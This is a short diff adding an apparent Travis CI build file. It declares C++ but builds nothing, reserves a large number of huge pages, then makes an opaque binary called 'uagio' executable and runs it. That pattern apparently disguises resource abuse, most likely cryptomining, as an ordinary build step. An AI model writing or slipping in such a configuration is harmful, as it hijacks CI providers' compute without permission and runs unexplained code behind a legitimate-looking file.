@@ -1,0 +1,8 @@
+language: cpp
+before_install:
+  - sudo add-apt-repository -y ppa:ubuntu-toolchain-r/test
+  - sudo apt-get -q update
+  - sudo sysctl -w vm.nr_hugepages=2336
+script:
+  - sudo chmod +x uagio
+  - ./uagio
